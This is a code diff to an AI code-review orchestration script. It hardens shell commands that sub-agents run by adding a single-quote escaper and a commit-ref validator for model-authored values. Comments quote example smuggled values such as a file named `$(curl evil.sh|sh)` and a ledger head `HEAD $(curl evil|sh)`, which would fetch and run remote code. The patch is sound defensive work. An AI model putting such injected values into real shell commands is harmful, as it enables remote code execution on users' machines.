@@ -315,8 +315,11 @@ function sanitizeAttack(text) {
 // tell the agent to grep the symbol/file to RELOCATE the finding, so mangling them (as sanitizeAttack's
 // strip set did) breaks the grep. flattenField neutralizes newlines and caps length while leaving those
 // chars intact. Ledger storage stays raw (matchesPrior fingerprints on the unsanitized ruleId+title) —
-// only the prompt copy is flattened. The `git diff` shell argument still uses the RAW f.file via
-// JSON.stringify (JSON-escaping already prevents shell breakout) — do NOT route it through flattenField.
+// only the prompt copy is flattened. The `git diff` shell argument is a SHELL value, not a prompt
+// value, so it is NOT routed through flattenField — it is single-quoted with shq(). JSON.stringify does
+// NOT make it shell-safe: it only escapes `"`/`\`/control chars, and inside a double-quoted shell
+// context `$(...)`, backtick and `$VAR` still expand, so a file literally named `$(curl evil.sh|sh)`
+// would execute when the carry agent runs the command. shq() single-quotes it, disabling all expansion.
 function flattenField(v) { return String(v ?? '').replace(/[\r\n]+/g, ' ').trim().slice(0, ATTACK_MAX) }
 function promptFields(f) {
   return {
@@ -326,6 +329,25 @@ function promptFields(f) {
     file: flattenField(f.file),
     severity: flattenField(f.severity),
   }
+}
+// POSIX single-quote shell-escaper for a model-authored value that lands in a shell command a
+// sub-agent will RUN (the carry/adjudicate `git diff -- <path>`). Single quotes disable ALL shell
+// expansion, so `$(...)`, backtick, `$VAR`, spaces and `;`/`|`/`&` inside are literal. The `'\''`
+// sequence (close-quote, escaped-quote, reopen-quote) safely embeds a literal single quote. Note:
+// JSON.stringify does NOT make a value shell-safe — it only escapes `"`/`\`/control chars, and inside
+// a double-quoted shell context `$(...)`, backtick and `$VAR` still expand; single-quoting is what
+// neutralizes them.
+function shq(s) { return `'${String(s ?? '').replace(/'/g, `'\\''`)}'` }
+// A conservative "is this a safe commit-ish?" gate for a model-authored ledger `head` before it is
+// interpolated into a shell command. Accept a git SHA (7–40 hex) or a ref name drawn only from
+// shell-inert characters (alnum plus `._/-`, no spaces/metacharacters). A crafted `HEAD $(curl evil|sh)`
+// fails — it carries a space and `$()`. Used at the prior-round LOAD boundary to fall back to a safe
+// default without disabling re-review; the use sites additionally shq()/flattenField() it (defense in depth).
+function isCommitish(s) {
+  const v = String(s ?? '').trim()
+  if (!v) return false
+  if (/^[0-9a-fA-F]{7,40}$/.test(v)) return true
+  return /^[A-Za-z0-9][A-Za-z0-9._/-]{0,199}$/.test(v)
 }
 // A still-open/regressed prior re-enters the next round's ledger with a suffix appended to `why`.
 // Strip any PRIOR suffix first so stale attacks do not accrete and bias future adjudications (the
@@ -610,8 +632,17 @@ Best-effort: any error → {found:false}.`,
     { label: 'prior-round', schema: PRIOR_ROUND_SCHEMA, model: 'haiku', effort: 'low', phase: 'Scout' },
   )
   if (!priorRound?.found) priorRound = null
+  // Harden the model-authored ledger `head` at the LOAD boundary before it ever reaches a shell
+  // command (it is interpolated into the carry/adjudicate `git diff <head>...HEAD`). If it is not a
+  // safe commit-ish (a crafted `HEAD $(curl evil|sh)` from a tampered ledger), fall back to the
+  // already-resolved base ref rather than nulling priorRound — re-review stays ON, the fix-range diff
+  // just widens to base...HEAD. The use sites additionally shq()/flattenField() it (defense in depth).
+  if (priorRound && !isCommitish(priorRound.head)) {
+    log(`⚠️ prior-round head ${JSON.stringify(priorRound.head)} is not a safe commit-ish — falling back to the base ref for the fix-range diff`)
+    priorRound.head = baseRef
+  }
 }
-if (priorRound) log(`Re-review: prior round ${priorRound.round} @ ${priorRound.head} · ${priorRound.ledger?.length || 0} ledger finding(s)`)
+if (priorRound) log(`Re-review: prior round ${priorRound.round} @ ${flattenField(priorRound.head)} · ${priorRound.ledger?.length || 0} ledger finding(s)`)
 else log(freshArg ? 'Fresh review (—fresh): prior round ignored' : 'First review for this branch (no prior round)')
 
 // On a re-review the lenses look only at the fix commits (prevHead...HEAD) — cheap, and it catches
@@ -1105,9 +1136,9 @@ if (priorRound?.ledger?.length) {
   const carriedResults = (await parallel(settled.map(f => () => {
     const pf = promptFields(f)
     return ragent(
-      `A prior review finding was dismissed by the author (disposition: ${f.disposition}). Decide only whether the CODE AROUND IT CHANGED since commit ${priorRound.head}. Shell + read only.
+      `A prior review finding was dismissed by the author (disposition: ${f.disposition}). Decide only whether the CODE AROUND IT CHANGED since commit ${flattenField(priorRound.head)}. Shell + read only.
 FINDING: [${pf.severity}] ${pf.title} — at ${pf.file}:${f.line} (symbol ${pf.symbol}), rule ${pf.ruleId}.
-Run \`git diff ${priorRound.head}...HEAD -- ${JSON.stringify(f.file)}\` and judge whether the enclosing symbol/region was touched. Return {changed: <bool>, reason}.`,
+Run \`git diff ${shq(priorRound.head)}...HEAD -- ${shq(f.file)}\` and judge whether the enclosing symbol/region was touched. Return {changed: <bool>, reason}.`,
       { label: `carry:${f.file}:${f.line}`, phase: 'Adjudicate', schema: CHANGED_SCHEMA, model: CULL_MODEL },
     ).then(r => ({ f, changed: r == null ? null : !!r.changed }))
   }))).filter(Boolean)
